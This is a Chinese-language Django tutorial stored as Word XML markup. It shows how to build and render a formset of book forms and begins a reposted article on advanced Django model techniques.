    <w:p w14:paraId="6BC13406" w14:textId="3E1CF342" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>有的时候用户需要在1个页面上使用多个表单，比如一次性提交添加多本书的信息，这时我们可以使用formset。这是一个表单的集合。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB70FB7" w14:textId="2984EE93" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BE2A95B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建一个FormSet我们可以这么做:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060669F2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0074E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38A55058" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class BookForm(forms.Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065A314E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = forms.CharField(max_length=100)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36974C21" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    title = forms.CharField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BAE392" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    pub_date = forms.DateField(required=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02810A87" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C20C45B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># forms.py - build a formset of books</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6EA0BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E9A1FF7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.forms import formset_factory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707B1AAC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>from .forms import BookForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC61FCC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62479214" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"># extra: </w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>额外的空表单数量</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39912E25" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"># max_num: </w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>包含表单数量（不含空表单</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E24FCEF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41880C02" w14:textId="11A410CB" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BookFormSet = formset_factory(BookForm, extra=2, max_num=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B417D9F" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A7D0EE2" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在视图文件views.py里，我们可以像使用form一样使用formset。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724E279E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># views.py - formsets example.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71557FD5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import BookFormSet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E857B1D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C871F5F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51524D53" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def manage_books(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452E2ABF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == 'POST':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA5A587" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        formset = BookFormSet(request.POST, request.FILES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7A44B6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if formset.is_valid():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BAC4E2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            # do something with the formset.cleaned_data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E266621" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182D552C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C42608D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        formset = BookFormSet()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB0D0EF" w14:textId="1E292A24" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'manage_books.html', {'formset': formset})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4C630D" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板里可以这样使用formset。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBB939E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;form action=”.” method=”POST”&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FF2AC25" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ formset }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3980B7B9" w14:textId="5D1B0098" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="533272AD" w14:textId="3088638F" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>后续我们会专门介绍formset的使用案例。欲知更多Python Web开发与Django实战案例，请关注我们的微信公众号【Python与Django大咖之路】。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7448D8B1" w14:textId="39791783" w:rsidR="001C47AF" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">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016</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId256" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础(6): 模型Models高级进阶必读。</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67B9C195" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础(6): 模型Models高级进阶必读。可以不吃粽子，但不能不读此文。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C447141" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId257" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-06-16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B9BBAE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1861DFB9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD08A0E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你或许已经早已读过我们的原创文章</w:t>
      </w:r>
      <w:hyperlink r:id="rId258" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(1): 模型Models的介绍与设计</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，并已经知道一个模型的设计是一个app的核心。然而仅知道基础知识是远远不够的，在实际web开发过程中你需要掌握一些模型的高级技巧，比如灵活定义Meta选项，动态定义文件上传路径，使用Manager方</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>法，重写save方法，才能充分发挥Django的灵活优势。今天小编我以亲身经历就来讲下Django模型Models的高级进阶，分享些实用技巧。另外送个粽子给大家，祝大家端午节快乐！！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444D30B9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CB12921" w14:textId="7364B9EB" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个最基本的django模型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6383DB3C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们来先看下一个新闻博客的Article模型。这个模型是最基本的django模型，里面包括了各个字段（fields)，重写了显示文章对象名字的__str__方法（python内置的），并在Meta选项里给模型命名(verbose name)。我们建议每个django模型至少包括字段，重写的__str__方法和Meta选项。</w:t>
      </w:r>
    </w:p>
